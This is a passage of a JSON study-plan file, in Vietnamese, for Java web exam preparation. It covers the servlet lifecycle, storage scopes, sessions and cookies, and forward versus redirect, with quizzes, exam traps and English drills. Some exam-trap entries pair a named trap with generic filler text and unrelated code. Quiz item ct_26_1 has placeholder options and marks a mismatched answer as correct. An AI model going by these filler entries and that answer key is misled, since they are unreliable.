        "Vẽ sơ đồ vòng đời Servlet",
        "Hiểu rõ container tạo duy nhất 1 instance Servlet cho nhiều thread requests"
      ],
      "englishDrill": [
        {
          "id": 73,
          "vi": "Lấy dữ liệu trường id từ form",
          "en": "Get data of ID field from form"
        },
        {
          "id": 74,
          "vi": "Lấy tất cả danh sách dữ liệu có trong cơ sở dữ liệu",
          "en": "Get all data list from database"
        },
        {
          "id": 75,
          "vi": "lấy giá trị của phương thức X gán vào biến Y",
          "en": "Set value of method X for variable Y"
        },
        {
          "id": 76,
          "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
          "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
        },
        {
          "id": 77,
          "vi": "Nếu A>B thì tiến hành update thông tin học sinh. Ngược lại hãy xử lí thêm mới thông tin học sinh.",
          "en": "If A>B, update student information, else, add student information."
        }
      ],
      "summary": "JavaWeb: Servlet Architecture, Vòng đời (Lifecycle) init/service/destroy.",
      "coreTheory": "\n### 1. Kiến trúc Servlet & Web Container (Tomcat)\n- Trình duyệt gửi HTTP Request $\\rightarrow$ Tomcat tạo thread mới $\\rightarrow$ Gọi Servlet $\\rightarrow$ Trả về HTTP Response.\n\n### 2. Vòng đời Servlet (Servlet Lifecycle)\n1. `init(ServletConfig config)`: Được gọi **DUY NHẤT 1 LẦN** khi Servlet được nạp vào bộ nhớ.\n2. `service(HttpServletRequest req, HttpServletResponse resp)`: Được gọi **MỖI KHI CÓ REQUEST ĐẾN**. Điều phối sang `doGet()`, `doPost()`...\n3. `destroy()`: Được gọi **DUY NHẤT 1 LẦN** khi server shutdown hoặc servlet bị undeploy.\n- **Lưu ý:** Container chỉ tạo duy nhất **1 instance (Singleton-like)** cho mỗi Servlet class, các request được xử lý trên các Thread khác nhau!\n",
      "codeSnippet": "@WebServlet(\"/hello\")\npublic class HelloServlet extends HttpServlet {\n    public void init() { /* Chạy 1 lần duy nhất */ }\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        resp.getWriter().println(\"Hello World\");\n    }\n    public void destroy() { /* Chạy 1 lần duy nhất */ }\n}",
      "traps": [
        "Biến instance trong Servlet không an toàn đa luồng (Non-thread-safe) vì nhiều thread dùng chung 1 servlet instance.",
        "doGet xử lý request GET, doPost xử lý request POST."
      ],
      "quickQuiz": [
        {
          "q": "Phương thức init() chạy mấy lần?",
          "a": "Duy nhất 1 lần."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Servlet Lifecycle: init(), service() -> doGet()/doPost(), destroy(), HttpServletRequest & HttpServletResponse, Web container / Tomcat role.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Kiến trúc Servlet & Web Container (Tomcat)\n- Trình duyệt gửi HTTP Request $\\rightarrow$ Tomcat tạo thread mới $\\rightarrow$ Gọi Servlet $\\rightarrow$ Trả về HTTP Response.\n\n### 2. Vòng đời Servlet (Servlet Lifecycle)\n1. `init(ServletConfig config)`: Được gọi **DUY NHẤT 1 LẦN** khi Servlet được nạp vào bộ nhớ.\n2. `service(HttpServletRequest req, HttpServletResponse resp)`: Được gọi **MỖI KHI CÓ REQUEST ĐẾN**. Điều phối sang `doGet()`, `doPost()`...\n3. `destroy()`: Được gọi **DUY NHẤT 1 LẦN** khi server shutdown hoặc servlet bị undeploy.\n- **Lưu ý:** Container chỉ tạo duy nhất **1 instance (Singleton-like)** cho mỗi Servlet class, các request được xử lý trên các Thread khác nhau!\n",
          "code": "@WebServlet(\"/hello\")\npublic class HelloServlet extends HttpServlet {\n    public void init() { /* Chạy 1 lần duy nhất */ }\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        resp.getWriter().println(\"Hello World\");\n    }\n    public void destroy() { /* Chạy 1 lần duy nhất */ }\n}"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d25_1",
          "level": "Medium",
          "question": "Đoạn mã Servlet sau có nguy cơ tiềm ẩn lỗi gì?",
          "code": "public class CounterServlet extends HttpServlet {\n    private int count = 0; // Instance variable\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) \n            throws IOException {\n        count++;\n        res.getWriter().print(\"Count: \" + count);\n    }\n}",
          "options": [
            "Lỗi Race Condition (tranh chấp đa luồng) khi nhiều request truy cập đồng thời",
            "Compile Error vì Servlet không được khai báo field",
            "Mỗi request đều in ra Count: 1 vì mỗi request tạo 1 Servlet mới",
            "Lỗi NullPointerException"
          ],
          "correctIndex": 0,
          "explanation": "Servlet Container (như Tomcat) mặc định chỉ tạo DUY NHẤT 1 instance của Servlet (Singleton) phục vụ cho tất cả người dùng, mỗi request chạy trên một luồng (thread) riêng. Khai báo biến đếm `private int count;` là instance field sẽ bị các luồng cùng đọc/ghi đồng thời mà không đồng bộ, gây ra hiện tượng Race Condition làm sai lệch kết quả!"
        }
      ],
      "examTraps": [
        {
          "trap": "Khai báo biến lưu trữ dữ liệu người dùng dưới dạng biến instance trong Servlet",
          "whyPeopleWrong": "Quen tay khai báo private String currentUser; trong class Servlet.",
          "wrongThinking": "Tưởng rằng mỗi người dùng có 1 đối tượng Servlet riêng.",
          "correctRule": "Servlet là Single Instance - Multi-threaded (1 instance phục vụ đồng thời hàng ngàn request). Biến instance sẽ bị các luồng của người dùng khác nhau ghi đè lung tung (Race Condition)! Mọi dữ liệu người dùng phải lưu trong biến local bên trong doGet/doPost.",
          "code": "public class MyServlet extends HttpServlet {\n    // private String userId; // LỖI NGHIÊM TRỌNG ĐA LUỒNG!\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n        String userId = req.getParameter(\"id\"); // CHUẨN XÁC\n    }\n}",
          "miniCheck": "Class Servlet tuyệt đối không chứa biến instance lưu trạng thái người dùng."
        },
        {
          "trap": "Cạm bẫy 1: Biến instance trong Servlet không an toàn đa luồng (Non-thread-safe) vì nhiều thread dùng chung 1 servlet instance.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "@WebServlet(\"/hello\")\npublic class HelloServlet extends HttpServlet {\n    public void init() { /* Chạy 1 lần duy nhất */ }\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        resp.getWriter().println(\"Hello World\");\n    }\n    public void destroy() { /* Chạy 1 lần duy nhất */ }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: doGet xử lý request GET, doPost xử lý request POST.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "@WebServlet(\"/hello\")\npublic class HelloServlet extends HttpServlet {\n    public void init() { /* Chạy 1 lần duy nhất */ }\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        resp.getWriter().println(\"Hello World\");\n    }\n    public void destroy() { /* Chạy 1 lần duy nhất */ }\n}",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Vòng đời của Servlet",
          "questions": [
            {
              "q": "Kể tên 3 phương thức cốt lõi trong vòng đời (Lifecycle) của Servlet theo đúng thứ tự.",
              "ans": "1) `init()` (chạy 1 lần duy nhất khi servlet được nạp) -> 2) `service()` (chạy mỗi khi có request tới) -> 3) `destroy()` (chạy 1 lần duy nhất khi ứng dụng undeploy hoặc server shutdown)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Đa luồng trong Servlet",
          "questions": [
            {
              "q": "Servlet Container (như Tomcat) quản lý số lượng thể hiện (instance) của một Servlet như thế nào khi có nhiều request đồng thời?",
              "ans": "Servlet Container mặc định chỉ tạo DUY NHẤT 1 instance (Singleton pattern) cho mỗi cấu hình Servlet. Mỗi request đến được xử lý trên một luồng (thread) riêng biệt cùng gọi phương thức `service()` trên instance duy nhất đó."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace bẫy rò rỉ luồng trên biến instance của Servlet",
          "questions": [
            {
              "q": "Cho đoạn code trong Servlet:\n```java\npublic class CounterServlet extends HttpServlet {\n    private int count = 0;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {\n        count++;\n        System.out.print(count + \" \");\n    }\n}\n```\nBiến `count` có an toàn trong môi trường đa luồng không? Tại sao?",
              "ans": "KHÔNG an toàn (Thread-unsafe)! Vì chỉ có 1 instance duy nhất của Servlet được chia sẻ cho mọi thread, biến instance `count` sẽ bị tranh chấp dữ liệu (Race Condition). Cần tránh dùng biến instance có trạng thái thay đổi trong Servlet."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy cấu hình load-on-startup",
          "questions": [
            {
              "q": "Thuộc tính `load-on-startup = 1` trong cấu hình Servlet có tác dụng gì?",
              "ans": "Chỉ thị cho Servlet Container khởi tạo Servlet và gọi hàm `init()` ngay khi ứng dụng web khởi động (server boot), thay vì đợi đến khi có request đầu tiên gửi đến."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Filter chain và thứ tự thực thi",
          "questions": [
            {
              "q": "Trong cấu hình `Filter`, câu lệnh `chain.doFilter(request, response);` đóng vai trò gì?",
              "ans": "Chuyển tiếp request và response đến Filter tiếp theo trong chuỗi, hoặc đến Servlet đích nếu là Filter cuối cùng. Mọi code viết sau dòng `chain.doFilter` sẽ được thực thi trên chiều ngược lại khi response trả về client."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_25_1",
          "q": "Phương thức nào trong vòng đời của Servlet chỉ chạy DUY NHẤT 1 LẦN khi Servlet được khởi tạo?",
          "options": [
            "init()",
            "service()",
            "doGet()",
            "doPost()"
          ],
          "correct": 0,
          "exp": "init() chỉ chạy 1 lần duy nhất khi Servlet được nạp vào bộ nhớ container để khởi tạo cấu hình. service(), doGet(), doPost() chạy mỗi khi có request tới."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Vòng đời (Lifecycle) của một Servlet trong Servlet Container diễn ra như thế nào?",
          "a": "1. Nạp class & gọi `init()` duy nhất 1 lần khi servlet được tải.\n2. Mỗi request đến, container tạo 1 thread mới và gọi `service()` (từ đó điều phối sang `doGet()` hoặc `doPost()`).\n3. Khi server tắt hoặc reload app, gọi `destroy()` duy nhất 1 lần để giải phóng tài nguyên.",
          "trap": "Servlet là Singleton trong Container, không khai báo biến trạng thái người dùng trong instance variable!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 73,
          "vi": "Lấy dữ liệu trường id từ form",
          "en": "Get data of ID field from form"
        },
        {
          "id": 74,
          "vi": "Lấy tất cả danh sách dữ liệu có trong cơ sở dữ liệu",
          "en": "Get all data list from database"
        },
        {
          "id": 75,
          "vi": "lấy giá trị của phương thức X gán vào biến Y",
          "en": "Set value of method X for variable Y"
        },
        {
          "id": 76,
          "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
          "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
        },
        {
          "id": 77,
          "vi": "Nếu A>B thì tiến hành update thông tin học sinh. Ngược lại hãy xử lí thêm mới thông tin học sinh.",
          "en": "If A>B, update student information, else, add student information."
        }
      ],
      "chapter": "JavaWeb: Servlet Architecture & Lifecycle"
    },
    "26": {
      "day": 26,
      "week": 4,
      "title": "JavaWeb: Scopes, Session & Cookies",
      "topics": [
        "4 Scopes: page, request, session, application (ServletContext)",
        "Session Tracking: HttpSession (setAttribute, getAttribute)",
        "Cookies vs Session",
        "URL Rewriting"
      ],
      "tasks": [
        "Lập bảng so sánh 4 phạm vi lưu trữ (Scopes)",
        "Giải thích cơ chế Cookie session JSESSIONID"
      ],
      "englishDrill": [
        {
          "id": 76,
          "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
          "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
        },
        {
          "id": 77,
          "vi": "Nếu A>B thì tiến hành update thông tin học sinh. Ngược lại hãy xử lí thêm mới thông tin học sinh.",
          "en": "If A>B, update student information, else, add student information."
        },
        {
          "id": 78,
          "vi": "Đếm số record thõa mãn điều kiện abc. Nếu số record trả về lớn hơn Y thì hãy hiển thị thông tin xyz lên màn hình.",
          "en": "Count records which satisfy abc condition. If number of returned records is greater than Y, show information xyz on screen."
        },
        {
          "id": 79,
          "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
          "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
        },
        {
          "id": 1,
          "vi": "Lấy danh sách các trận đấu",
          "en": "Get list of matches"
        }
      ],
      "summary": "JavaWeb: 4 Scopes (Phạm vi lưu trữ), Session Tracking (HttpSession vs Cookies).",
      "coreTheory": "\n### 1. 4 Phạm Vi Lưu Trữ (Scopes) trong JavaWeb\n1. **Page Scope:** Chỉ tồn tại trong chính trang JSP hiện tại.\n2. **Request Scope (`HttpServletRequest`):** Tồn tại trong 1 lượt request-response (giữ nguyên khi dùng Forward).\n3. **Session Scope (`HttpSession`):** Tồn tại theo phiên làm việc của từng người dùng cụ thể.\n4. **Application Scope (`ServletContext`):** Tồn tại trong toàn bộ ứng dụng, mọi người dùng đều dùng chung.\n\n### 2. Session Tracking: Cookies vs HttpSession\n- **Cookie:** Lưu ở phía Trình duyệt (Client), dung lượng nhỏ (<4KB), kém bảo mật hơn.\n- **Session:** Lưu ở phía Server, an toàn hơn. Server gửi cookie `JSESSIONID` về client để nhận diện phiên.\n",
      "codeSnippet": "// Lưu dữ liệu vào session\nHttpSession session = request.getSession();\nsession.setAttribute(\"currentUser\", user);\n\n// Đọc dữ liệu từ session\nUser user = (User) session.getAttribute(\"currentUser\");",
      "traps": [
        "Cookie lưu ở Client, Session lưu ở Server.",
        "Tắt cookie trên trình duyệt thì session phải dựa vào URL Rewriting để truyền JSESSIONID."
      ],
      "quickQuiz": [
        {
          "q": "Scope nào dùng chung cho tất cả người dùng trong toàn bộ ứng dụng?",
          "a": "Application Scope (ServletContext)"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: 4 Scopes: page, request, session, application (ServletContext), Session Tracking: HttpSession (setAttribute, getAttribute), Cookies vs Session.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. 4 Phạm Vi Lưu Trữ (Scopes) trong JavaWeb\n1. **Page Scope:** Chỉ tồn tại trong chính trang JSP hiện tại.\n2. **Request Scope (`HttpServletRequest`):** Tồn tại trong 1 lượt request-response (giữ nguyên khi dùng Forward).\n3. **Session Scope (`HttpSession`):** Tồn tại theo phiên làm việc của từng người dùng cụ thể.\n4. **Application Scope (`ServletContext`):** Tồn tại trong toàn bộ ứng dụng, mọi người dùng đều dùng chung.\n\n### 2. Session Tracking: Cookies vs HttpSession\n- **Cookie:** Lưu ở phía Trình duyệt (Client), dung lượng nhỏ (<4KB), kém bảo mật hơn.\n- **Session:** Lưu ở phía Server, an toàn hơn. Server gửi cookie `JSESSIONID` về client để nhận diện phiên.\n",
          "code": "// Lưu dữ liệu vào session\nHttpSession session = request.getSession();\nsession.setAttribute(\"currentUser\", user);\n\n// Đọc dữ liệu từ session\nUser user = (User) session.getAttribute(\"currentUser\");"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_26_1",
          "level": "Easy",
          "question": "Scope nào dùng chung cho tất cả người dùng trong toàn bộ ứng dụng?",
          "code": "// Lưu dữ liệu vào session\nHttpSession session = request.getSession();\nsession.setAttribute(\"currentUser\", user);\n\n// Đọc dữ liệu từ session\nUser user = (User) session.getAttribute(\"currentUser\");",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Application Scope (ServletContext)"
        }
      ],
      "examTraps": [
        {
          "trap": "Lưu giỏ hàng vào Application Scope (ServletContext)",
          "whyPeopleWrong": "Thấy Application Scope lưu được lâu dài nên dùng.",
          "wrongThinking": "Quên mất Application Scope dùng chung cho TẤT CẢ mọi người trên toàn cầu.",
          "correctRule": "Nếu lưu giỏ hàng vào Application Scope, giỏ hàng của người dùng này sẽ bị người dùng khác nhìn thấy và thêm/bớt đè lên nhau!",
          "code": "req.getSession().setAttribute(\"cart\", myCart); // Đúng chuẩn theo từng User",
          "miniCheck": "Dữ liệu của riêng 1 người dùng thì luôn chọn Session Scope."
        },
        {
          "trap": "Cạm bẫy 1: Cookie lưu ở Client, Session lưu ở Server.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Lưu dữ liệu vào session\nHttpSession session = request.getSession();\nsession.setAttribute(\"currentUser\", user);\n\n// Đọc dữ liệu từ session\nUser user = (User) session.getAttribute(\"currentUser\");",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: Tắt cookie trên trình duyệt thì session phải dựa vào URL Rewriting để truyền JSESSIONID.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Lưu dữ liệu vào session\nHttpSession session = request.getSession();\nsession.setAttribute(\"currentUser\", user);\n\n// Đọc dữ liệu từ session\nUser user = (User) session.getAttribute(\"currentUser\");",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Các phạm vi (Scopes) trong Web Java",
          "questions": [
            {
              "q": "Kể tên 4 phạm vi lưu trữ dữ liệu (Scopes) trong ứng dụng web Java từ hẹp nhất đến rộng nhất.",
              "ans": "`Page Scope` -> `Request Scope` (`HttpServletRequest`) -> `Session Scope` (`HttpSession`) -> `Application Scope` (`ServletContext`)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Cơ chế quản lý Session và JSESSIONID",
          "questions": [
            {
              "q": "Làm thế nào Server nhận diện được các request liên tiếp đến từ cùng một người dùng?",
              "ans": "Khi Session được tạo, Server sinh ra một mã định danh duy nhất `JSESSIONID` và gửi về Client qua Cookie. Ở các request sau, trình duyệt tự động gửi lại Cookie này; nếu client tắt cookie, server sử dụng kỹ thuật URL Rewriting (`encodeURL`)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace truy xuất dữ liệu từ Session",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nHttpSession session = req.getSession(false);\nif (session != null) {\n    System.out.println(\"Exists\");\n} else {\n    System.out.println(\"Null\");\n}\n```\nTham số `false` trong `req.getSession(false)` có ý nghĩa gì?",
              "ans": "Nếu đã tồn tại session cho client này thì trả về session đó; nếu CHƯA CÓ thì trả về `null` (không tự ý tạo session mới). Nếu không truyền tham số hoặc truyền `true`, một session mới sẽ tự động được tạo nếu chưa tồn tại."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy lưu trữ object không Serializable vào Session",
          "questions": [
            {
              "q": "Tại sao các đối tượng lưu vào `HttpSession` được khuyến nghị bắt buộc phải implements interface `java.io.Serializable`?",
              "ans": "Để Servlet Container có thể tuần tự hóa (Serialize) session ra ổ đĩa khi server khởi động lại (Session Persistence) hoặc chuyển session qua các máy chủ khác trong cụm server (Clustering / Load Balancing)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Cấu hình Session Timeout",
          "questions": [
            {
              "q": "Cấu hình `<session-timeout>30</session-timeout>` trong file `web.xml` được tính theo đơn vị thời gian nào?",
              "ans": "Được tính theo đơn vị PHÚT (30 phút). Trong khi hàm `session.setMaxInactiveInterval(1800)` trong code Java lại tính theo đơn vị GIÂY (1800 giây = 30 phút)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_26_1",
          "q": "Để lưu thông tin giỏ hàng (Shopping Cart) của một người dùng xuyên suốt quá trình mua sắm qua nhiều trang web, phạm vi (Scope) nào là phù hợp nhất?",
          "options": [
            "Session Scope",
            "Request Scope",
            "Page Scope",
            "Application Scope"
          ],
          "correct": 0,
          "exp": "Session Scope gắn liền với phiên làm việc của một người dùng cụ thể xuyên suốt nhiều request, cực kỳ phù hợp để lưu giỏ hàng và trạng thái đăng nhập."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Phân biệt 4 phạm vi lưu trữ (Scopes) trong ứng dụng Java Web Servlet/JSP?",
          "a": "- page: Chỉ tồn tại trong trang JSP hiện tại.\n- request: Tồn tại trong 1 chu kỳ HTTP Request-Response (chia sẻ qua forward).\n- session: Tồn tại qua nhiều request của cùng 1 người dùng (dựa vào JSESSIONID).\n- application (ServletContext): Toàn bộ ứng dụng, chia sẻ cho TẤT CẢ người dùng.",
          "trap": "Lưu dữ liệu riêng của người dùng vào ServletContext sẽ làm lộ thông tin sang người dùng khác!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 76,
          "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
          "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
        },
        {
          "id": 77,
          "vi": "Nếu A>B thì tiến hành update thông tin học sinh. Ngược lại hãy xử lí thêm mới thông tin học sinh.",
          "en": "If A>B, update student information, else, add student information."
        },
        {
          "id": 78,
          "vi": "Đếm số record thõa mãn điều kiện abc. Nếu số record trả về lớn hơn Y thì hãy hiển thị thông tin xyz lên màn hình.",
          "en": "Count records which satisfy abc condition. If number of returned records is greater than Y, show information xyz on screen."
        },
        {
          "id": 79,
          "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
          "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
        },
        {
          "id": 1,
          "vi": "Lấy danh sách các trận đấu",
          "en": "Get list of matches"
        }
      ],
      "chapter": "JavaWeb: Scopes, Session & Cookies"
    },
    "27": {
      "day": 27,
      "week": 4,
      "title": "JavaWeb: JSP, JSTL, Filter & RequestDispatcher",
      "topics": [
        "RequestDispatcher.forward() vs HttpServletResponse.sendRedirect()",
        "JSP syntax: scriptlet, expression, directive",
        "EL (Expression Language) & JSTL core tags (c:if, c:forEach)",
        "Filter lifecycle (doFilter, chain.doFilter) & Listener"
      ],
      "tasks": [
        "Lập bảng so sánh chi tiết Forward vs Redirect (URL thay đổi không? request giữ nguyên không?)",
        "Vẽ sơ đồ flow Browser -> Servlet -> DAO -> DB -> JSP -> Browser"
      ],
      "englishDrill": [
        {
          "id": 79,
          "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
          "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
        },
        {
          "id": 1,
          "vi": "Lấy danh sách các trận đấu",
          "en": "Get list of matches"
        },
        {
          "id": 2,
          "vi": "Thực hiện xóa các trận đấu",
          "en": "Delete matches"
        },
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time"
        },
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches"
        }
      ],
      "summary": "JavaWeb: Forward vs Redirect, JSP, JSTL, EL & Servlet Filter.",
      "coreTheory": "\n### 1. Forward vs Redirect (Câu hỏi Audit số 1)\n- **Forward (`RequestDispatcher.forward`):**\n  - Xảy ra ở phía **Server**.\n  - URL trên trình duyệt **KHÔNG ĐỔI**.\n  - Chỉ có 1 lượt request-response.\n  - Đối tượng `request` được **giữ nguyên** (request attributes không bị mất).\n- **Redirect (`response.sendRedirect`):**\n  - Server gửi mã HTTP 302 yêu cầu **Trình duyệt tạo request MỚI**.\n  - URL trên thanh địa chỉ **BỊ THAY ĐỔI**.\n  - Mất 2 lượt request-response.\n  - Dữ liệu `request` cũ bị hủy bỏ hoàn toàn.\n\n### 2. Servlet Filter\n- Chặn và lọc request trước khi tới Servlet (kiểm tra đăng nhập, mã hóa UTF-8).\n- Bắt buộc phải gọi `chain.doFilter(req, resp)` để request tiếp tục đi tới đích!\n",
      "codeSnippet": "// Forward (Server-side)\nrequest.getRequestDispatcher(\"home.jsp\").forward(request, response);\n\n// Redirect (Client-side)\nresponse.sendRedirect(\"login.jsp\");",
      "traps": [
        "Quên chain.doFilter trong Filter sẽ làm request bị nghẽn lại vĩnh viễn.",
        "Dùng sendRedirect sẽ làm mất toàn bộ request.setAttribute đã gắn."
      ],
      "quickQuiz": [
        {
          "q": "Phương thức nào giữ nguyên dữ liệu request.setAttribute?",
          "a": "RequestDispatcher.forward()"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: RequestDispatcher.forward() vs HttpServletResponse.sendRedirect(), JSP syntax: scriptlet, expression, directive, EL (Expression Language) & JSTL core tags (c:if, c:forEach).",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. Forward vs Redirect (Câu hỏi Audit số 1)\n- **Forward (`RequestDispatcher.forward`):**\n  - Xảy ra ở phía **Server**.\n  - URL trên trình duyệt **KHÔNG ĐỔI**.\n  - Chỉ có 1 lượt request-response.\n  - Đối tượng `request` được **giữ nguyên** (request attributes không bị mất).\n- **Redirect (`response.sendRedirect`):**\n  - Server gửi mã HTTP 302 yêu cầu **Trình duyệt tạo request MỚI**.\n  - URL trên thanh địa chỉ **BỊ THAY ĐỔI**.\n  - Mất 2 lượt request-response.\n  - Dữ liệu `request` cũ bị hủy bỏ hoàn toàn.\n\n### 2. Servlet Filter\n- Chặn và lọc request trước khi tới Servlet (kiểm tra đăng nhập, mã hóa UTF-8).\n- Bắt buộc phải gọi `chain.doFilter(req, resp)` để request tiếp tục đi tới đích!\n",
          "code": "// Forward (Server-side)\nrequest.getRequestDispatcher(\"home.jsp\").forward(request, response);\n\n// Redirect (Client-side)\nresponse.sendRedirect(\"login.jsp\");"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d27_1",
          "level": "Medium",
          "question": "Đoạn code chuyển hướng trang sau có đặc điểm gì?",
          "code": "// Servlet 1\nrequest.setAttribute(\"user\", \"Trung\");\nRequestDispatcher rd = request.getRequestDispatcher(\"page2.jsp\");\nrd.forward(request, response);",
          "options": [
            "page2.jsp lấy được attribute 'user' và URL trình duyệt không thay đổi",
